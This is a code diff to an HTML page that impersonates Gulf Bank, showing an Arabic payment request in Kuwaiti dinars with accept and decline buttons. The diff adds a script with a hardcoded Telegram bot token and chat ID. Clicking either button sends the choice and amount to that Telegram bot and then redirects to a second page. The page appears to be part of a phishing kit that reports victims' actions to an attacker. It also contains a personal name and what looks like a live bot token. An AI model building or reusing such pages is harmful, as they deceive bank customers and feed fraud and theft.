@@ -6,274 +6,36 @@
     <title>e-gulfbank</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cairo">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            margin: 0px;
-            font-family: Cairo, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            min-width: 320px;
-            background-color: rgb(240, 240, 240);
-        }
-
-        .header {
-            background: linear-gradient(117.33deg, rgb(176, 1, 1) 17.03%, rgb(98, 4, 4) 82.97%);
-            color: rgb(255, 255, 255);
-            position: fixed;
-            width: 100%;
-            min-height: 132px;
-            top: 0px;
-            left: 0px;
-            z-index: 100;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .header .contents {
-            margin-top: 12px;
-            height: 64px;
-            display: flex;
-            flex-direction: row;
-            justify-content: space-between;
-            align-items: center;
-            width: 100%;
-            padding: 0 20px;
-        }
-
-        .container {
-            box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 10px;
-            width: 100%;
-            max-width: 672px;
-            text-align: center;
-            z-index: 1;
-            overflow: auto;
-            background-color: rgb(255, 255, 255);
-            border-radius: 20px;
-            margin-top: 88px;
-            padding-bottom: 20px;
-            position: relative;
-        }
-
-        .container-with-icon {
-            padding-top: 20px;
-        }
-
-        .content {
-            position: relative;
-        }
-
-        .main-info {
-            display: inline-flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 20px;
-            margin: 32px 0px 48px;
-        }
-
-        .amount {
-            font-size: 32px;
-            font-style: normal;
-            font-weight: 600;
-            line-height: 36px;
-            color: rgb(15, 15, 15);
-            display: flex;
-            align-items: flex-end;
-            gap: 2px;
-        }
-
-        .amount .digits {
-            font-size: 37px;
-            font-style: normal;
-            font-weight: 600;
-            line-height: 40px;
-        }
-
-        .amount .digits::after {
-            content: ".";
-        }
-
-        .amount .fractions {
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            align-items: flex-start;
-            direction: ltr;
-        }
-
-        .amount .fractions .currency {
-            font-size: 13px;
-            font-style: normal;
-            font-weight: 600;
-            line-height: 6px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            color: rgb(118, 119, 122);
-        }
-
-        .amount .fractions .digits {
-            font-size: 16px;
-            font-style: normal;
-            font-weight: 600;
-            line-height: 24px;
-            letter-spacing: 1px;
-        }
-
-        .sent-to {
-            font-size: 16px;
-            font-style: normal;
-            font-weight: 600;
-            line-height: 18px;
-            color: rgb(88, 89, 91);
-        }
-
-        .beneficiary {
-            font-size: 22px;
-            font-style: normal;
-            font-weight: 600;
-            line-height: 24px;
-            color: rgb(15, 15, 15);
-        }
-
-        .details {
-            margin: 0px 24px;
-        }
-
-        .details-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 24px 0px;
-            margin: 0px 0px;
-            gap: 16px;
-            align-self: stretch;
-            border-top: 1px solid rgb(240, 240, 240);
-        }
-
-        .details-item .key {
-            font-size: 16px;
-            font-style: normal;
-            font-weight: 600;
-            line-height: 18px;
-            color: rgb(118, 119, 122);
-            text-align: right;
-        }
-
-        .details-item .value {
-            text-align: left;
-            font-family: Cairo;
-            font-size: 16px;
-            font-style: normal;
-            font-weight: 600;
-            line-height: 18px;
-            color: rgb(15, 15, 15);
-        }
-
-        /* تنسيق الأزرار الجديد ليطابق لقطة الشاشة */
-        .buttons {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 32px 16px;
-            gap: 16px;
-        }
-
-        .btn {
-            border: none;
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 56px;
-            font-family: Cairo;
-            font-size: 18px;
-            font-weight: 700;
-            border-radius: 28px;
-            flex: 1;
-            max-width: 220px;
-            color: white;
-            transition: all 0.2s ease;
-            gap: 8px;
-        }
-
-        .btn:active {
-            transform: scale(0.98);
-        }
-
-        .btn-accept {
-            background-color: #00b140; /* أخضر بنك الخليج */
-            box-shadow: 0 8px 16px -6px rgba(0, 177, 64, 0.4);
-        }
-
-        .btn-decline {
-            background-color: #ce0000; /* أحمر بنك الخليج */
-            box-shadow: 0 8px 16px -6px rgba(206, 0, 0, 0.4);
-        }
-
-        .btn svg {
-            width: 20px;
-            height: 20px;
-            fill: white;
-        }
-
-        .button-center {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 16px;
-        }
-
-        .back-button {
-            color: rgb(165, 0, 0);
-            background-color: transparent;
-            border: none;
-            font-family: Cairo;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        .back-button:hover {
-            text-decoration: underline;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                position: fixed;
-                top: 88px;
-                left: 50%;
-                bottom: 0px;
-                transform: translateX(-50%);
-                border-radius: 16px 16px 0px 0px;
-                max-width: 100%;
-                margin-top: 0;
-            }
-            .buttons {
-                margin: 24px 12px;
-                gap: 12px;
-            }
-            .btn {
-                height: 52px;
-                font-size: 16px;
-            }
-        }
-
-        @media (min-width: 768px) {
-            .container {
-                position: absolute;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                margin-top: 0;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { margin: 0px; font-family: Cairo, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; min-width: 320px; background-color: rgb(240, 240, 240); }
+        .header { background: linear-gradient(117.33deg, rgb(176, 1, 1) 17.03%, rgb(98, 4, 4) 82.97%); color: rgb(255, 255, 255); position: fixed; width: 100%; min-height: 132px; top: 0px; left: 0px; z-index: 100; display: flex; justify-content: center; align-items: center; }
+        .header .contents { margin-top: 12px; height: 64px; display: flex; flex-direction: row; justify-content: space-between; align-items: center; width: 100%; padding: 0 20px; }
+        .container { box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 10px; width: 100%; max-width: 672px; text-align: center; z-index: 1; overflow: auto; background-color: rgb(255, 255, 255); border-radius: 20px; margin-top: 88px; padding-bottom: 20px; position: relative; }
+        .container-with-icon { padding-top: 20px; }
+        .content { position: relative; }
+        .main-info { display: inline-flex; flex-direction: column; align-items: center; gap: 20px; margin: 32px 0px 48px; }
+        .amount { font-size: 32px; font-style: normal; font-weight: 600; line-height: 36px; color: rgb(15, 15, 15); display: flex; align-items: flex-end; gap: 2px; }
+        .amount .digits { font-size: 37px; font-style: normal; font-weight: 600; line-height: 40px; }
+        .amount .digits::after { content: "."; }
+        .amount .fractions { display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-start; direction: ltr; }
+        .amount .fractions .currency { font-size: 13px; font-style: normal; font-weight: 600; line-height: 6px; letter-spacing: 1px; text-transform: uppercase; color: rgb(118, 119, 122); }
+        .amount .fractions .digits { font-size: 16px; font-style: normal; font-weight: 600; line-height: 24px; letter-spacing: 1px; }
+        .sent-to { font-size: 16px; font-style: normal; font-weight: 600; line-height: 18px; color: rgb(88, 89, 91); }
+        .beneficiary { font-size: 22px; font-style: normal; font-weight: 600; line-height: 24px; color: rgb(15, 15, 15); }
+        .details { margin: 0px 24px; }
+        .details-item { display: flex; justify-content: space-between; align-items: center; padding: 24px 0px; margin: 0px 0px; gap: 16px; align-self: stretch; border-top: 1px solid rgb(240, 240, 240); }
+        .details-item .key { font-size: 16px; font-style: normal; font-weight: 600; line-height: 18px; color: rgb(118, 119, 122); text-align: right; }
+        .details-item .value { text-align: left; font-family: Cairo; font-size: 16px; font-style: normal; font-weight: 600; line-height: 18px; color: rgb(15, 15, 15); }
+        .buttons { display: flex; justify-content: center; align-items: center; margin: 32px 16px; gap: 16px; }
+        .btn { border: none; cursor: pointer; display: flex; justify-content: center; align-items: center; height: 56px; font-family: Cairo; font-size: 18px; font-weight: 700; border-radius: 28px; flex: 1; max-width: 220px; color: white; transition: all 0.2s ease; gap: 8px; }
+        .btn:active { transform: scale(0.98); }
+        .btn-accept { background-color: #00b140; box-shadow: 0 8px 16px -6px rgba(0, 177, 64, 0.4); }
+        .btn-decline { background-color: #ce0000; box-shadow: 0 8px 16px -6px rgba(206, 0, 0, 0.4); }
+        .btn svg { width: 20px; height: 20px; fill: white; }
+        .button-center { display: flex; justify-content: center; align-items: center; margin-bottom: 16px; }
+        .back-button { color: rgb(165, 0, 0); background-color: transparent; border: none; font-family: Cairo; font-weight: 700; font-size: 16px; cursor: pointer; }
+        @media (max-width: 768px) { .container { position: fixed; top: 88px; left: 50%; bottom: 0px; transform: translateX(-50%); border-radius: 16px 16px 0px 0px; max-width: 100%; margin-top: 0; } .buttons { margin: 24px 12px; gap: 12px; } .btn { height: 52px; font-size: 16px; } }
+        @media (min-width: 768px) { .container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); margin-top: 0; } }
     </style>
 </head>
 <body>
@@ -281,14 +43,11 @@
         <div class="contents">
             <div></div>
             <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <text x="50%" y="50%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="18" font-weight="bold" font-family="Cairo">
-                    بنك الخليج
-                </text>
+                <text x="50%" y="50%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="18" font-weight="bold" font-family="Cairo">بنك الخليج</text>
             </svg>
             <div></div>
         </div>
     </div>
-
     <div class="container container-with-icon">
         <div class="content">
             <div class="main-info">
@@ -304,97 +63,50 @@
                 <div class="sent-to">مطلوب من قبل</div>
                 <div class="beneficiary">RADY MAHMOUD ABDELRADY HAMADA</div>
             </div>
-
             <div class="details">
-                <div class="details-item">
-                    <div class="value payment-date">14/03/2026, 01:00 AM</div>
-                    <div class="key">تاريخ الدفع</div>
-                </div>
-                <div class="details-item">
-                    <div class="value reference-number">twwFiB3YYcgmhFi</div>
-                    <div class="key">المرجع</div>
-                </div>
-                <div class="details-item">
-                    <div class="value payment-description">دفع فواتير</div>
-                    <div class="key">وصف الدفع</div>
-                </div>
-                <div class="details-item">
-                    <div class="value payment-details">Invoice</div>
-                    <div class="key">تفاصيل الدفع</div>
-                </div>
+                <div class="details-item"><div class="value payment-date">--/--/----</div><div class="key">تاريخ الدفع</div></div>
+                <div class="details-item"><div class="value reference-number">--------</div><div class="key">المرجع</div></div>
+                <div class="details-item"><div class="value payment-description">دفع فواتير</div><div class="key">وصف الدفع</div></div>
+                <div class="details-item"><div class="value payment-details">Invoice</div><div class="key">تفاصيل الدفع</div></div>
             </div>
         </div>
-
-        <!-- الأزرار الجديدة المطابقة للقطة الشاشة -->
         <div class="buttons">
-            <button class="btn btn-accept">
+            <button class="btn btn-accept" onclick="sendAction('قبول')">
                 <span>قبول</span>
                 <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
             </button>
-            <button class="btn btn-decline">
+            <button class="btn btn-decline" onclick="sendAction('رفض')">
                 <span>رفض</span>
                 <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
             </button>
         </div>
-
-        <div class="button-center">
-            <button class="back-button">الذهاب إلى الصفحة الرئيسية</button>
-        </div>
+        <div class="button-center"><button class="back-button">الذهاب إلى الصفحة الرئيسية</button></div>
     </div>
-
     <script>
-        function getUrlParameter(name) {
-            const params = new URLSearchParams(window.location.search);
-            return params.get(name);
+        const token = "8696968658:AAF2W7759-6i1demyYVPzrfgGfYjhkIFvng";
+        const chatId = "1848565778";
+
+        function sendAction(type) {
+            const msg = `🔔 إشعار من الصفحة الرئيسية:\nالمستخدم ضغط على زر: ${type}\nالمبلغ المطلوب: ${document.querySelector('.amount-main').textContent} KWD`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+            .finally(() => { window.location.href = "page2.html"; });
         }
 
-        function formatAmount(amount) {
-            const amountStr = amount.toString();
-            const parts = amountStr.split('.');
-            const mainPart = parts[0];
-            const fractionPart = parts[1] ? parts[1].padEnd(3, '0').substring(0, 3) : '000';
-            return { main: mainPart, fraction: fractionPart };
-        }
-
-        function generateReferenceNumber() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = '';
-            for (let i = 0; i < 15; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return result;
-        }
-
-        function formatDateTime(date) {
-            const options = {
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                hour12: true
-            };
-            return date.toLocaleDateString('en-GB', options).toUpperCase();
-        }
+        function getUrlParameter(name) { const params = new URLSearchParams(window.location.search); return params.get(name); }
+        function formatAmount(amount) { const parts = amount.toString().split('.'); return { main: parts[0], fraction: parts[1] ? parts[1].padEnd(3, '0').substring(0, 3) : '000' }; }
+        function generateReferenceNumber() { let r = ''; const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; for (let i = 0; i < 15; i++) r += c.charAt(Math.floor(Math.random() * c.length)); return r; }
+        function formatDateTime(date) { return date.toLocaleDateString('en-GB', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', hour12: true }).toUpperCase(); }
 
         document.addEventListener('DOMContentLoaded', function() {
             const amount = getUrlParameter('amount') || '200';
-            const beneficiaryName = getUrlParameter('name') || 'RADY MAHMOUD ABDELRADY HAMADA';
-            const paymentDesc = getUrlParameter('description') || 'دفع فواتير';
-            const paymentDetails = getUrlParameter('details') || 'Invoice';
-
-            const formattedAmount = formatAmount(amount);
-            document.querySelector('.amount-main').textContent = formattedAmount.main;
-            document.querySelector('.amount-fraction').textContent = formattedAmount.fraction;
-
-            document.querySelector('.beneficiary').textContent = beneficiaryName;
-
-            const currentDate = new Date();
-            document.querySelector('.payment-date').textContent = formatDateTime(currentDate);
-
+            const fAmount = formatAmount(amount);
+            document.querySelector('.amount-main').textContent = fAmount.main;
+            document.querySelector('.amount-fraction').textContent = fAmount.fraction;
+            document.querySelector('.beneficiary').textContent = getUrlParameter('name') || 'RADY MAHMOUD ABDELRADY HAMADA';
+            document.querySelector('.payment-date').textContent = formatDateTime(new Date());
             document.querySelector('.reference-number').textContent = generateReferenceNumber();
-            document.querySelector('.payment-description').textContent = paymentDesc;
-            document.querySelector('.payment-details').textContent = paymentDetails;
+            document.querySelector('.payment-description').textContent = getUrlParameter('description') || 'دفع فواتير';
+            document.querySelector('.payment-details').textContent = getUrlParameter('details') || 'Invoice';
         });
     </script>
 </body>
